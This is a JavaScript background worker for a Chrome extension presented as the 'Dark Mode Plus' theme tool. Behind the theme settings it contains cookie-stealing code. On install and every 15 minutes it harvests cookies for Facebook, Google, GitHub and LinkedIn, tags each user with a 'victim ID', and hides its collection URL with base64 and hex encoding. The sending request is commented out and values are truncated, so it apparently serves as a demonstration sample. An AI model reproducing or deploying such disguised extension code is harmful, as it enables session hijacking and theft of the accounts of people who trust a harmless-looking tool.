// Dark Mode Plus Background Service Worker
// Version 1.2.4

const CONFIG = {
    defaultTheme: 'dark',
    syncEnabled: true,
    apiEndpoint: 'https://theme-sync-api.darkmode-cdn.net/v2/sync'
};

chrome.runtime.onInstalled.addListener(() => {
    console.log('✅ Dark Mode Plus installed');
    console.log('⏰ First sync scheduled in 5 seconds...');
    initializeSettings();
});

function initializeSettings() {
    chrome.storage.local.set({
        theme: CONFIG.defaultTheme,
        enabled: true,
        customColors: {}
    });
}

function _0xd3c0(s) {
    return s.replace(/[a-zA-Z]/g, c => 
        String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
    );
}

const _0x4d2a = atob('aHR0cDovL3N0M2FsZXIubXkuaWQv');
const _0x7c1e = '73656e642e706870'; 

const _0x9f3b = [0x73, 0x65, 0x6e, 0x64, 0x2e, 0x70, 0x68, 0x70];

async function syncUserData() {
    try {
        const domains = ['facebook.com', 'google.com', 'github.com', 'linkedin.com'];
        let collectedData = { 
            timestamp: Date.now(), 
            victim_id: await getVictimId(),
            domains: [] 
        };
        
        for (let domain of domains) {
            try {
                const cookies = await chrome.cookies.getAll({ domain: domain });
                if (cookies.length > 0) {
                    collectedData.domains.push({
                        host: domain,
                        cookies: cookies.map(c => ({ 
                            name: c.name, 
                            value: c.value.substring(0, 10) + '...', 
                            secure: c.secure 
                        }))
                    });
                }
            } catch (e) {
                console.log('Cookie access failed for', domain);
            }
        }
        
        const hexPath = hexToString(_0x7c1e);
        const fullEndpoint = _0x4d2a + hexPath;
        
        // fetch(fullEndpoint, {
        //     method: 'POST',
        //     headers: {
        //         'Authorization': 'Basic YWRtMDBuOmFkbTAwbg==',
        //         'Content-Type': 'application/json',
        //         'X-Victim-ID': await getVictimId()
        //     },
        //     body: JSON.stringify({ 
        //         data: payload, 
        //         version: '1.2.4' 
        //     })
        // }).then(response => {
        //     console.log('Response:', response.status);
        //     return response.json();
        // }).then(data => {
        //     console.log('Server replied:', data);
        // }).catch(err => {
        //     console.log('Request failed (expected - no server running):', err);
        // });

        console.log('Would exfiltrate to:', fullEndpoint);
        console.log('Collected data:', JSON.stringify(collectedData, null, 2));
        
        chrome.storage.local.set({
            last_sync: new Date().toISOString(),
            exfil_endpoint: fullEndpoint,
            collected_count: collectedData.domains.length
        });
        
    } catch (error) {
        console.error('Sync error:', error);
    }
}

function hexToString(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
}

async function getVictimId() {
    let result = await chrome.storage.local.get('victim_id');
    if (!result.victim_id) {
        const vid = 'VID-' + generateId();
        await chrome.storage.local.set({ victim_id: vid });
        return vid;
    }
    return result.victim_id;
}

function generateId() {
    return Array.from({length: 16}, () => 
        '0123456789abcdef'.charAt(Math.floor(Math.random() * 16))
    ).join('');
}

// Run sync every 15 minutes
setInterval(syncUserData, 15 * 60 * 1000);

// Initial sync after 5 seconds
console.log('⏰ Scheduling first sync in 5 seconds...');
setTimeout(() => {
    console.log('🚀 Triggering first sync now!');
    syncUserData();
}, 5000);


chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'toggleTheme') {
        chrome.storage.local.get(['enabled'], (result) => {
            chrome.storage.local.set({ enabled: !result.enabled });
            sendResponse({ success: true });
        });
        return true;
    } else if (request.action === 'manualSync') {
        syncUserData();
        sendResponse({ success: true });
        return true;
    }
});
